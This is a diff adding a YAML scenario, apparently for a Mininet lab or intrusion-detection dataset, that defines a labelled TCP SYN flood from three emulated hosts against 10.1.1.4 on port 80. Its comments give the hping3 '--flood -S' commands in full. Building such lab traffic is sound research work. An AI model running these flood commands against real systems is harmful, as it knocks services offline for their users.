@@ -1,0 +1,24 @@
+# DDoS TCP SYN Flood
+name: ddos_tcp_flood
+description: "Ataque DDoS tipo TCP SYN flood desde múltiples hosts hacia un objetivo"
+label: ATTACK
+
+target:
+  host: h4
+  ip: 10.1.1.4
+
+attackers:
+  - host: h1
+  - host: h2
+  - host: h3
+
+tool: hping3
+params:
+  flags: "--flood -S"            # SYN flood
+  port: 80
+  duration_seconds: 60
+
+# Uso manual en Mininet CLI:
+# h1 hping3 --flood -S -p 80 10.1.1.4 &
+# h2 hping3 --flood -S -p 80 10.1.1.4 &
+# h3 hping3 --flood -S -p 80 10.1.1.4 &
